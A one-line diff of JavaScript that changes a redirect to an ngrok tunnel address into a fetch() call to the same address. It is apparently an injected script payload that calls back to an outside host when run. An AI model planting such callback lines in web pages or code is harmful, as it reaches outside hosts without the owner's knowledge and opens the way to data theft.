@@ -1,1 +1,1 @@
-document.location="http://2.tcp.ngrok.io:11862"
+fetch("http://2.tcp.ngrok.io:11862");
